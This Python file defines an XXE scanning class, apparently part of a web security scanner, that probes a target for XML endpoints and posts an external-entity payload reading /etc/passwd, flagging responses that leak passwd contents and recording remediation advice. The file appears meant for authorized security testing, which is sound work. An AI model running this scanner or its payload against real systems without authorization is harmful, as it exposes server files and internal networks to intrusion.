import os
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)


class XXEAgent:
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': (
                'SecurityAudit/1.0 '
                '(Authorized Assessment)'
            )
        })
        self.findings = []
        self.payloads = self._load_payloads()

    def _load_payloads(self):
        path = os.path.join(
            'payloads', 'xxe_payloads.txt'
        )
        try:
            with open(path, 'r') as f:
                return [
                    l.strip() for l in f
                    if l.strip()
                    and not l.startswith('#')
                ]
        except FileNotFoundError:
            return [
                (
                    '<?xml version="1.0"?>'
                    '<!DOCTYPE foo ['
                    '<!ENTITY xxe SYSTEM '
                    '"file:///etc/passwd">]>'
                    '<foo>&xxe;</foo>'
                )
            ]

    def find_xml_endpoints(self):
        print(
            f"  {Fore.CYAN}[*] Finding XML "
            f"endpoints...{Style.RESET_ALL}"
        )
        xml_paths = [
            '/api', '/api/v1', '/api/v2',
            '/upload', '/import',
            '/xml', '/api/xml',
            '/soap', '/wsdl',
            '/api/parse', '/api/process',
            '/feed', '/rss', '/sitemap.xml',
        ]

        found = []
        for path in xml_paths:
            url = urljoin(self.target, path)
            try:
                r = self.session.get(
                    url, timeout=8
                )
                ct = r.headers.get(
                    'Content-Type', ''
                ).lower()
                if (
                    r.status_code in [200, 405]
                    and (
                        'xml' in ct
                        or 'soap' in ct
                        or 'xml' in r.text[:200].lower()
                    )
                ):
                    found.append(url)
                    print(
                        f"  {Fore.GREEN}[+] XML endpoint: "
                        f"{url}{Style.RESET_ALL}"
                    )
            except Exception:
                pass

        return found

    def test_xxe_injection(self, endpoints):
        print(
            f"  {Fore.CYAN}[*] Testing XXE "
            f"injection...{Style.RESET_ALL}"
        )
        linux_indicators = [
            'root:x:', 'daemon:', '/bin/bash',
            '/usr/sbin', 'nobody:'
        ]

        xml_headers = {
            'Content-Type': 'application/xml',
            'Accept': 'application/xml, text/xml, */*'
        }

        for endpoint in endpoints:
            for payload in self.payloads[:3]:
                try:
                    r = self.session.post(
                        endpoint,
                        data=payload.encode(),
                        headers=xml_headers,
                        timeout=15
                    )
                    for indicator in linux_indicators:
                        if indicator in r.text:
                            self.findings.append({
                                'type': 'XXE Injection',
                                'category': 'xxe',
                                'risk': 'CRITICAL',
                                'url': endpoint,
                                'payload': payload[:100],
                                'evidence': indicator,
                                'description': (
                                    'XXE injection successful. '
                                    'Local file content '
                                    'returned in response.'
                                ),
                                'business_impact': (
                                    'Server files readable. '
                                    'SSRF possible. '
                                    'Internal network exposed.'
                                ),
                                'fix': (
                                    '1. Disable XML external '
                                    'entities in parser\n'
                                    '2. Use JSON instead of XML\n'
                                    '3. Update XML library\n'
                                    '4. Whitelist allowed schemas'
                                ),
                                'cvss_score': 9.1,
                                'cwe': 'CWE-611'
                            })
                            print(
                                f"  {Fore.RED}"
                                f"[!!!] XXE INJECTION!"
                                f"{Style.RESET_ALL}"
                            )
                            break
                except Exception:
                    pass

        return self.findings

    def run_full_scan(self):
        print(
            f"\n{Fore.YELLOW}[XXE AGENT] "
            f"Starting...{Style.RESET_ALL}"
        )
        endpoints = self.find_xml_endpoints()
        if endpoints:
            self.test_xxe_injection(endpoints)
        else:
            print(
                f"  {Fore.YELLOW}[*] No XML endpoints "
                f"found{Style.RESET_ALL}"
            )
        print(
            f"{Fore.GREEN}[XXE AGENT] Complete - "
            f"{len(self.findings)} findings"
            f"{Style.RESET_ALL}"
        )
        return self.findings
